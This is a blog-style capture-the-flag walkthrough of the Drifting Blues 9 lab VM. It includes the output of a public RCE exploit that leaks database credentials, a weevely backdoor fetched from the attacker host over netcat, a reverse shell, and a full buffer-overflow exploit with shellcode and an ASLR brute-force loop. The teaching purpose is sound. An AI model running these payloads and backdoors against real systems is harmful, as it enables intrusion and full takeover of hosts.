---
layout: post
title:  "Drifting Blues 9 write-up"
date:   2021-07-15 09:40:00 +0100
tags:
- hack
- write-up
- VM

excerpt: "This is my write-up for Drifting Blues 9 VM, available on HackMyVM platform."

---
This is my write-up (my very first !) for Drifting Blues 9 VM, available on [HackMyVM](https://hackmyvm.eu/) platform.

## Enumeration
After launching VM, I start as always by evaluate network attack footprint.

### Finding VM IP
My local subnet is in the CIDR range 192.168.1.0/24, I do a `nmap` quick ping scan
```
# nmap -sn 192.168.1.0/24
```

Among another known hosts, the VM popped up :

```
# nmap -sn 192.168.1.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 03:08 EDT
...
Nmap scan report for debian.home (192.168.1.30)
Host is up (0.00090s latency).
MAC Address: 01:23:45:67:89:AB (Oracle VirtualBox virtual NIC)
...
Nmap done: 256 IP addresses (X hosts up) scanned in 2.11 seconds

```

The target machine is already name `debian.home`, no need to amend `/etc/hosts` for giving convenient name.

### Port enumeration

Now I focus on this target, by examining ports status :

```
nmap debian.home -p-
```
This will perform :
- A complete port scan, on all ports range (2<sup>16</sup>, 65535)
- Using TCP SYN port scan
- With normal timing (3)

```
# nmap debian.home -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-16 03:20 EDT
Nmap scan report for debian.home (192.168.1.30)
Host is up (0.00011s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
40592/tcp open  unknown
MAC Address: 08:00:27:6A:29:81 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
```
## Web part
Something is on 80, probably a webapp. Here is the homepage :

![Web app homepage](https://imgur.com/oYUSdHl.png)

Looks like another blogging platform, with one article.
### About structure
I try to find unreferenced files or backups. As it is php application
(click on 'Category 1' on right drives me to http://debian.home/index.php?page=posts&cat_id=1),
I focus on related extensions :

```
gobuster dir -u debian.home -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak
```

`gobuster` is a powerful directory/file enumerator. Here :
- Put it in directory/file enumeration mode.
- Use widely known directories list from `dirbuster` (available in Kali), the medium size one.
- Focus on `php`, `html`, `txt` and `bak` extensions (for sniffing automatic backup files)

```
# gobuster dir -u debian.home -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://debian.home
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,bak,txt
[+] Timeout:                 10s
===============================================================
2021/07/16 03:32:16 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://debian.home/images/]
/index.php            (Status: 200) [Size: 5650]
/docs                 (Status: 301) [Size: 309] [--> http://debian.home/docs/]
/page                 (Status: 301) [Size: 309] [--> http://debian.home/page/]
/header.php           (Status: 200) [Size: 13]
/admin                (Status: 301) [Size: 310] [--> http://debian.home/admin/]
/footer.php           (Status: 500) [Size: 614]
/license              (Status: 301) [Size: 312] [--> http://debian.home/license/]
/README.txt           (Status: 200) [Size: 975]
/js                   (Status: 301) [Size: 307] [--> http://debian.home/js/]
/include              (Status: 301) [Size: 312] [--> http://debian.home/include/]
/backup               (Status: 301) [Size: 311] [--> http://debian.home/backup/]
/styles               (Status: 301) [Size: 311] [--> http://debian.home/styles/]
/INSTALL.txt          (Status: 200) [Size: 1201]
/wysiwyg              (Status: 301) [Size: 312] [--> http://debian.home/wysiwyg/]
/server-status        (Status: 403) [Size: 276]
/mails                (Status: 301) [Size: 310] [--> http://debian.home/mails/]

===============================================================
2021/07/16 03:36:12 Finished
===============================================================
```
Strange, some directories popped up. Let's go to the `admin` one, http://debian.home/images :

![Image directory](https://imgur.com/6cmw9ki.png)

Seems directory indexes are allowed ! With this information, I can wander and gather precious informations
on site structure. I open http://debian.home/includes, you can see and find all *.php files.

Another point of interest : INSTALL.txt

http://debian.home/INSTALL.txt
```
///////////////////////////////////////////////////////////////////////////////////
//
// Advanced Power of PHP
// ---------------------
// http://www.apphp.com
//
// ApPHP MicroBlog Free
//
// Version: 1.0.1
//
///////////////////////////////////////////////////////////////////////////////////

Software requirements: PHP 5.0 or later version.

To install ApPHP MicroBlog, you should have to extract the ApPHP MicroBlog ZIP file.
It depends on the operating system you use.
Once extracted, you will have a directory containing the ApPHP MicroBlog script.

Upload all content of this directory to your webserver, either by copying the
directory or by using an FTP program.

Then you will need to run the installation module.
To do this you need to open a browser and type in the URL:

If you are running on your own computer, this will be

   http://localhost/{micro-blog directory}/install.php

or if on a live server:

   http://{www.mydomain.com}/install.php

On this page you need:

1. Enter connection parameters:
   database host, database name, username, password.

2. Enter admin login and admin password, that you will use to administer the site.
```

Multiples informations here :
- `install.php` is mentioned but not found
- Web app system is ApPHP MicroBlog Free, version 1.0.1

### Exploitation

Quick `searchsploit` looks promising :

```
# searchsploit apphp 1.0.1
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
ApPHP MicroBlog 1.0.1 - Multiple Vulnerabilities                                    | php/webapps/33030.txt
ApPHP MicroBlog 1.0.1 - Remote Command Execution                                    | php/webapps/33070.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Let's examine RCE. It's a python script that take in as argument the site URL running ApPHP webapp.
It should send back a shell.

```
# searchsploit -x 33070
  Exploit: ApPHP MicroBlog 1.0.1 - Remote Command Execution
      URL: https://www.exploit-db.com/exploits/33070
     Path: /usr/share/exploitdb/exploits/php/webapps/33070.py
File Type: Python script, ASCII text executable, with CRLF line terminators
```

Run the exploit :

- It's a Python 2.X script only
- It's mandatory to provide `index.php`
```
# python2.7 /usr/share/exploitdb/exploits/php/webapps/33070.py http://debian.home/index.php

 -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-
original exploit by Jiko : http://www.exploit-db.com/exploits/33030/
[*] Testing for vulnerability...
[+] Website is vulnerable

[*] Fecthing phpinfo
	PHP Version 5.6.40-0+deb8u12
	System   Linux debian 3.16.0-4-586 #1 Debian 3.16.51-2 (2017-12-03) i686
	Loaded Configuration File   /etc/php5/apache2/php.ini
	Apache Version   Apache/2.4.10 (Debian)
	User/Group   www-data(33)/33
	Server Root   /etc/apache2
	DOCUMENT_ROOT   /var/www/html
	PHP Version   5.6.40-0+deb8u12
	allow_url_fopen  On  On
	allow_url_include  Off  Off
	disable_functions  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,
	open_basedir   no value    no value
	System V Message based IPC   Wez Furlong
	System V Semaphores   Tom May
	System V Shared Memory   Christian Cartus

[*] Fetching include/base.inc.php
<?php
			// DATABASE CONNECTION INFORMATION
			define('DATABASE_HOST', 'localhost');	        // Database host
			define('DATABASE_NAME', 'microblog');	        // Name of the database to be used
			define('DATABASE_USERNAME', 'clapton');	// User name for access to database
			define('DATABASE_PASSWORD', 'yaraklitepe');	// Password for access to database
			define('DB_ENCRYPT_KEY', 'p52plaiqb8');		// Database encryption key
			define('DB_PREFIX', 'mb101_');		    // Unique prefix of all table names in the database
			?>

[*] Testing remote execution
[+] Remote exec is working with system() :)
Submit your commands, type exit to quit
>
```
So I have a shell. I also have as a banner a dump of `base.inc.php` file and some informations
related to PHP version a command execution mode.

As we entered by regular PHP app, we logically are `www-data` :
```
> whoami
www-data
>
```

### Immediate connection persistence

#### Backdoor creation : `weevely`
Let's put a backdoor to ensure permanent connection, even in case flaw would be corrected.
We use [weevely](https://github.com/epinna/weevely3), which allow some builtin commands, obfuscation,
and some auto-completion.

_Note : the shell provided does not have TTY, we'll see later how to workaround_.

On my hacking machine, I generate a backdoor :

```
#`weevely`generate pass ./shell.php
```

Let's find a place where we can put our backdoor.
In the shell provided by exploit, simple `ls -la` show that `/var/www/html` seems to be owned by `root:root`.

Let's take a step upper and find all writable directories by current user (`www-data`) :
```
> find / -writable | grep -v -E "proc|dev"

...
/var/www/html/include
...
>
```

Among other results, we found that __only one directory in Apache exposed stucture is writable__. It is mandatory
to push the backdoor in HTTP-reachable point, in order to use it. This is the good place.

#### Backdoor sending
Let's create a reverse shell, not redirected to bash, but where in and out streams are from and to files

##### On hacking machine
`nc -lnvp 10000 < ./shell.php`

When a connection will occurs, the `./shell.php` file content will be sent

##### On VM

`nc 192.168.1.26 10000 > /var/www/html/include/shell.php`

This assumes that my hacking machine is reachable at `192.168.1.26`

When transfer is done, `CTRL+C` both side of connection.

#### Backdoor usage

```
weevely http://debian.home/include/shell.php pass

[+]`weevely`4.0.1

[+] Target:	debian.home
[+] Session:	/root/.weevely/sessions/debian.home/shell_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

weevely>
```
Here we are permanently connected.

## Privilege escalation

Try to find other interesting users :

```
weevely> :audit_etcpasswd
...
clapton:x:1000:1000:,,,:/home/clapton:/bin/bash
...
```

This must be the user to reach for owning `user.txt`.

### Trying to break in `clapton`

Nothing obvious (to me) at this point. So using`weevely``:file_upload` command, I uploaded [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).

But for comfortably running linpeas, or even run `su` command, a TTY shell is required,
which is unfortunatly not the case with weevely.

#### Spawn a TTY shell

- on my hacking machine, `nc -lnvp 10000` : connection opening on 10000
- on VM, use another`weevely`command : `:backdoor_reversetcp kali 10000`

Now, several methods exists for spawning shell with TTY, I used the latter (to be runned on VM) :

`python -c 'import pty; pty.spawn("/bin/sh")'`

Followed by `export TERM=xterm` and now I have a "real" shell;


#### Linpeas.sh
I run it : `./linpeas.sh > /tmp/results.log`
Here again, nothing seemed relevant in report. It suggests to try user = password.

`~ su clapton` with "clapton" as password failed.

I tried then with the database password (found in `/var/www/html/include/base.inc.php`)

Bingo :) ! got to `/home/clapton` and flag `user.txt`.

## Getting root

Home directory content :

```
clapton@debian:~$ ls -la
ls -la
total 24
dr-x------ 2 clapton clapton 4096 May  9 17:13 .
drwxr-xr-x 3 root    root    4096 May  9 16:57 ..
-rwsr-xr-x 1 root    root    5150 Sep 22  2015 input
-rwxr-xr-x 1 root    root     201 May  9 17:15 note.txt
-rw-r--r-- 1 clapton clapton   32 May  9 17:21 user.txt
```

`note.txt` leads to buffer overflow (this VM is tagged as easy...). I spotted that it is suid, and owned by root.
So __any execution will use root privileges instead of the current user ones__.

### Buffer overflow

Basic calls :
```
clapton@debian:~$ ./input
./input
Syntax: ./input <input string>
```

There is a parameter, that must be put in buffer, that can be overflowed.

```
clapton@debian:~$ ./input 1111
./input 1111
```

#### Decompilation
I retrieve the executable to my hacking machine by putting it in `/var/www/html/include`
(using`weevely`and www-data user). So after I can regularily download it.

Feeding it to [GHIDRA](https://ghidra-sre.org/), here is `main` function decompiled :

```c
int main(int argc,char **argv)
{
  char local_af [171];

  if (argc < 2) {
    printf("Syntax: %s <input string>\n",*argv);
    /* WARNING: Subroutine does not return */
    exit(0);
  }
  strcpy(local_af,argv[1]);
  return 0;
}
```

Vulnerable buffer is `local_af`, and size is 171.

##### Alternative for finding buffer size, without GHIDRA and on target

```
clapton@debian:~$ gdb ./input
(gdb) info functions
    info functions
    All defined functions:

    Non-debugging symbols:
    0x080482d4  _init
    0x08048310  printf@plt
    0x08048320  strcpy@plt
    0x08048330  __gmon_start__@plt
    0x08048340  exit@plt
    0x08048350  __libc_start_main@plt
    0x08048360  _start
    0x08048390  __x86.get_pc_thunk.bx
    0x080483a0  deregister_tm_clones
    0x080483d0  register_tm_clones
    0x08048410  __do_global_dtors_aux
    0x08048430  frame_dummy
    0x0804845d  main
    0x080484b0  __libc_csu_init
    0x08048520  __libc_csu_fini
    0x08048524  _fini

```
Now disassemble main :

```
(gdb) disass main
    disass main
    Dump of assembler code for function main:
       0x0804845d <+0>:     push   %ebp
       0x0804845e <+1>:     mov    %esp,%ebp
       0x08048460 <+3>:     and    $0xffffff>
       0x08048463 <+6>:     sub    $0xb0,%esp
       0x08048469 <+12>:    cmpl   $0x1,0x8(>
       0x0804846d <+16>:    jg     0x8048490>
       0x0804846f <+18>:    mov    0xc(%ebp)>
       0x08048472 <+21>:    mov    (%eax),%e>
       0x08048474 <+23>:    mov    %eax,0x4(>
       0x08048478 <+27>:    movl   $0x804854>
       0x0804847f <+34>:    call   0x8048310>
       0x08048484 <+39>:    movl   $0x0,(%es>
       0x0804848b <+46>:    call   0x8048340>
       0x08048490 <+51>:    mov    0xc(%ebp)>
       0x08048493 <+54>:    add    $0x4,%eax
       0x08048496 <+57>:    mov    (%eax),%e>
       0x08048498 <+59>:    mov    %eax,0x4(>
       0x0804849c <+63>:    lea    0x11(%esp>
       0x080484a0 <+67>:    mov    %eax,(%es>
       0x080484a3 <+70>:    call   0x8048320>
       0x080484a8 <+75>:    mov    $0x0,%eax
       0x080484ad <+80>:    leave
       0x080484ae <+81>:    ret
```

Assembler code states that buffer size is 0xB0 (`sub    $0xb0,%esp`), which is decimal 176.
Though we know that the real number is 171. Why this difference? According to my searches, it seems that GDB pads buffers
size by 16 bits. So 171 become 176 (the next 16 bits block).

In Kali, one can use some Metasploit tools
([pattern_create](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb)
and [pattern_offset](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb)):

```
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Now, in GDB (on VM) :
```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
    0x41376641 in ?? ()
```

SEGFAULT happened because we overflowed the buffer. With `pattern_offset`, one can now find precisely the buffer size :

In Kali
```
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 41376641
[*] Exact match at offset 171
```
Here again, 171.

#### Exploitation
I found on exploit DB a Linux `/bin/sh` exec : [13357](https://www.exploit-db.com/exploits/13357)

##### First payload

- Find size, python len() : 55 bytes
- Order we want : NOP + SHELLCODE + PAD + EIP
- 171 - 55 = 116, let's divide both side
- 58 bytes NOP
- 58 bytes PAD

Code (exploit_1.py):
```python
import struct
pad = "\x41" * 58
EIP = struct.pack("I", 0xbfe0e210)

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
NOP = "\x90" * 58
print NOP + shellcode + pad + EIP
```
- Fill with 'A'
- `struct.pack` is useful for little-endianing addresses (bytes inversion)

Then I can push `exploit_1.py` to VM by using `:file_upload``weevely`command

#####  Return address to put in EIP
For finding return address :
```
(gdb) run $(python /tmp/exploit_1.py)
Program received signal SIGSEGV, Segmentation fault.
    0xc042dc78 in ?? ()
```

Then look the resulting stack :
```
(gdb) x/100x $esp-200
x/100x $esp-200
0xbf9f3558:	0x00000000	0x080484a8	0xbf9f3571	0xbf9f3cdc
0xbf9f3568:	0x00000000	0xb773db48	0x90909001	0x90909090
0xbf9f3578:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf9f3588:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf9f3598:	0x90909090	0x90909090	0x90909090	0x90909090
0xbf9f35a8:	0x31909090	0xb0db31c0	0x5380cd06	0x74742f68
0xbf9f35b8:	0x642f6879	0xe3897665	0xb966c931	0x05b02712
0xbf9f35c8:	0xc03180cd	0x2f2f6850	0x2f686873	0x896e6962
0xbf9f35d8:	0x895350e3	0x0bb099e1	0x414180cd	0x41414141
0xbf9f35e8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf9f35f8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf9f3608:	0x41414141	0x41414141	0x41414141	0x41414141
0xbf9f3618:	0x41414141	0xc042dc78	0x00000000	0xbf9f36b4
0xbf9f3628:	0xbf9f36c0	0xb774fe9a	0x00000002	0xbf9f36b4
0xbf9f3638:	0xbf9f3654	0x0804974c	0x0804821c	0xb7732000
0xbf9f3648:	0x00000000	0x00000000	0x00000000	0x135ab3f4
0xbf9f3658:	0x965b37e5	0x00000000	0x00000000	0x00000000
0xbf9f3668:	0x00000002	0x08048360	0x00000000	0xb77556e0
0xbf9f3678:	0xb75db639	0xb7762000	0x00000002	0x08048360
0xbf9f3688:	0x00000000	0x08048381	0x0804845d	0x00000002
0xbf9f3698:	0xbf9f36b4	0x080484b0	0x08048520	0xb7750350
0xbf9f36a8:	0xbf9f36ac	0x0000001c	0x00000002	0xbf9f3cc8
0xbf9f36b8:	0xbf9f3cdc	0x00000000	0xbf9f3d8c	0xbf9f3db9
---Type <return> to continue, or q <return> to quit---

```

`0xbf9f3588` seems to be a good address candidate for jumping into the [NOP seld](https://en.wikipedia.org/wiki/NOP_slide)

I tried to send it again, and got resulting stack :

```
(gdb) x/100x $esp-200
x/100x $esp-200
0xbfc6c468:	0x00000000	0x080484a8	0xbfc6c481	0xbfc6dcdc
0xbfc6c478:	0x00000000	0xb77a5b48	0x90909001	0x90909090
0xbfc6c488:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfc6c498:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfc6c4a8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbfc6c4b8:	0x31909090	0xb0db31c0	0x5380cd06	0x74742f68
0xbfc6c4c8:	0x642f6879	0xe3897665	0xb966c931	0x05b02712
0xbfc6c4d8:	0xc03180cd	0x2f2f6850	0x2f686873	0x896e6962
0xbfc6c4e8:	0x895350e3	0x0bb099e1	0x414180cd	0x41414141
0xbfc6c4f8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfc6c508:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfc6c518:	0x41414141	0x41414141	0x41414141	0x41414141
0xbfc6c528:	0x41414141	0xc042dc78	0x00000000	0xbfc6c5c4
0xbfc6c538:	0xbfc6c5d0	0xb77b7e9a	0x00000002	0xbfc6c5c4
0xbfc6c548:	0xbfc6c564	0x0804974c	0x0804821c	0xb779a000
0xbfc6c558:	0x00000000	0x00000000	0x00000000	0x56222d49
0xbfc6c568:	0x13c58958	0x00000000	0x00000000	0x00000000
0xbfc6c578:	0x00000002	0x08048360	0x00000000	0xb77bd6e0
0xbfc6c588:	0xb7643639	0xb77ca000	0x00000002	0x08048360
0xbfc6c598:	0x00000000	0x08048381	0x0804845d	0x00000002
0xbfc6c5a8:	0xbfc6c5c4	0x080484b0	0x08048520	0xb77b8350
0xbfc6c5b8:	0xbfc6c5bc	0x0000001c	0x00000002	0xbfc6dcc8
0xbfc6c5c8:	0xbfc6dcdc	0x00000000	0xbfc6dd8c	0xbfc6ddb9
---Type <return> to continue, or q <return> to quit---
```

0xbfc6c488 - 0xbf9f3588 = 278F00. Such big distance can lead to [ASLR](https://fr.wikipedia.org/wiki/Address_space_layout_randomization) enabled.

How to check :
```
clapton@debian:~$ cat /proc/sys/kernel/randomize_va_space
cat /proc/sys/kernel/randomize_va_space
2
```
Damned ! "2" means it is enabled, so we can't predict with reasonable error the jumping address.

##### Second payload : repetition

Now the idea is __to repeat the program execution with a payload that will maximize chance for
our return address to target in NOP sled__.

As the stack location is random in memory each execution, I will create loop with "enough" tries (try and mistake mode)
in order to force the probability of my address pointing in NOP sled to occur.

So I need a different payload :

```python
import struct
pad = "\x41" * 171
EIP = struct.pack("I", 0xbfe0e210)

shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31>
NOP = "\x90" * 20000
print pad + EIP + NOP + shellcode
```

- Fill all the buffer with 'A'
- Put last address inside EIP target
- Shellcode
- Massive NOP sled : 20000

Order is also different in order to be unlimited in NOP sled size.

I uploaded it with `weevely` using `:file_upload` command, named `exploit_aslr.py`

First try on VM:
```
clapton@debian:~$ for i in {0..100}; do ./input $(/tmp/exploit_aslr.py): done
Segmentation fault
Segmentation fault
Segmentation fault
...
clapton@debian:~$

```

Unlucky. Second try, with 1000 occurences :

```
clapton@debian:~$ for i in {0..1000}; do ./input $(/tmp/exploit_aslr.py): done
Segmentation fault
Segmentation fault
Segmentation fault
...
#
```

Got it ! The `#` indicates we are root :

```
# whoami
whoami
root
#
```

Now I can flag the `root.txt`.

## Deadends

### Web app
- Using weevely, start SQL console and search for admin credentials.
- It is encrypted, find in `var/www/html/include/classes/Accounts.class.php` that is AES encryption
  with salt.
- Update admin password : `update microblog.mb101_accounts set password = AES_ENCRYPT('pass','p52plaiqb8') WHERE id = 1;`
- Logged as admin... Nothing !

### RPC
Initial `nmap` scan showed 111/tcp opened. Wander for RPC (especially NFS misconfiguration), but I found nothing.

```
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39735/udp6  status
|   100024  1          48044/udp   status
|   100024  1          59229/tcp   status
|_  100024  1          59230/tcp6  status
```
